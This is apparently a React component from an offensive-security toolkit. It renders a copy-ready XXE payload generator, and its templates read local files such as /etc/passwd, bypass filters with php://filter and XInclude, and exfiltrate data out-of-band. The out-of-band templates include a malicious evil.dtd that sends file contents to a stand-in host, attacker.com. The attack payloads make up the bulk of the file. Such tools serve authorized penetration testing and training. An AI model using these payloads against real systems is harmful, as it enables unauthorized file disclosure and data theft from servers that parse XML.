import React, { useState } from 'react';
import { Card, Button, Input, TabNav, PayloadBlock, Toast} from '../../../components/ui';
import { ToolHeader } from '../../../components/ui/ToolHeader';
import { FileCode, Copy, Info, Settings } from 'lucide-react';

export default function XXETool() {
    const [activeTab, setActiveTab] = useState('inband');
    const [config, setConfig] = useState({
        resource: 'file:///etc/passwd',
        dtdPath: 'http://attacker.com/evil.dtd',
        remoteServer: 'http://attacker.com/'
    });
    const [showToast, setShowToast] = useState(false);

    const tabs = [
        { id: 'inband', label: 'In-Band (Basic)' },
        { id: 'oob', label: 'Out-of-Band (Blind)' },
    ];

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setConfig(prev => ({ ...prev, [name]: value }));
    };

    const formatPayload = (template: string) => {
        return template
            .replace('{RESOURCE}', config.resource)
            .replace('{DTD_PATH}', config.dtdPath)
            .replace('{REMOTE_SERVER}', config.remoteServer);
    };

    const INBAND_PAYLOADS = [
        {
            name: 'Basic XML Entity',
            desc: 'Classic local file inclusion via entity',
            template: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{RESOURCE}"> ]>
<foo>&xxe;</foo>`
        },
        {
            name: 'PHP Filter Wrapper',
            desc: 'Bypass filters using php:// wrapper (Base64)',
            template: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={RESOURCE}"> ]>
<foo>&xxe;</foo>`
        },
        {
            name: 'XInclude',
            desc: 'XInclude attack when DOCTYPE is disabled',
            template: `<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="{RESOURCE}"/>
</foo>`
        }
    ];

    const OOB_PAYLOADS = [
        {
            name: 'Blind XXE (External DTD)',
            desc: 'Load external DTD to exfiltrate data',
            template: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY % xxe SYSTEM "{DTD_PATH}"> 
  %xxe; 
]>`
        },
        {
            name: 'Malicious DTD File',
            desc: 'Content of evil.dtd to host on attacker server',
            template: `<!ENTITY % file SYSTEM "{RESOURCE}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{REMOTE_SERVER}?x=%file;'>">
%eval;
%exfil;`
        },
        {
            name: 'Parameter Entity OOB',
            desc: 'Trigger OOB DNS lookup',
            template: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{REMOTE_SERVER}"> %xxe; ]>`
        }
    ];

    return (
        <div className="space-y-6">
            <ToolHeader
                title="XML External Entity (XXE)"
                description="XXE injection payloads for exploiting XML parsers and extracting sensitive data"
            />

            <Card className="!p-6 space-y-4 border-l-4 border-l-htb-green">
                <h3 className="text-sm font-bold text-gray-300 uppercase tracking-wider flex items-center gap-2">
                    <Settings size={16} /> Configuration
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                        <label className="text-xs font-medium text-gray-400">Target Resource (File/URL)</label>
                        <Input
                            name="resource"
                            value={config.resource}
                            onChange={handleChange}
                            placeholder="file:///etc/passwd"
                        />
                    </div>
                    {activeTab === 'oob' && (
                        <>
                            <div className="space-y-2">
                                <label className="text-xs font-medium text-gray-400">Attacker DTD URL</label>
                                <Input
                                    name="dtdPath"
                                    value={config.dtdPath}
                                    onChange={handleChange}
                                    placeholder="http://attacker.com/evil.dtd"
                                />
                            </div>
                            <div className="space-y-2">
                                <label className="text-xs font-medium text-gray-400">Receiver Server</label>
                                <Input
                                    name="remoteServer"
                                    value={config.remoteServer}
                                    onChange={handleChange}
                                    placeholder="http://attacker.com/"
                                />
                            </div>
                        </>
                    )}
                </div>
            </Card>

            <TabNav tabs={tabs} activeTab={activeTab} onTabChange={setActiveTab} />

            <div className="space-y-4">
                {(activeTab === 'inband' ? INBAND_PAYLOADS : OOB_PAYLOADS).map((item, idx) => {
                    const finalPayload = formatPayload(item.template);
                    return (
                        <div key={idx} className="mb-6">
                            <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-3 border-b border-white/10 pb-2">
                                {item.name}
                            </h3>
                            <p className="text-xs text-gray-400 mb-3">{item.desc}</p>
                            <PayloadBlock content={finalPayload} />
                        </div>
                    );
                })}
            </div>

            {/* Toast Notification */}
                                <Toast show={showToast} message="Copied to clipboard!" />
        </div>
    );
}
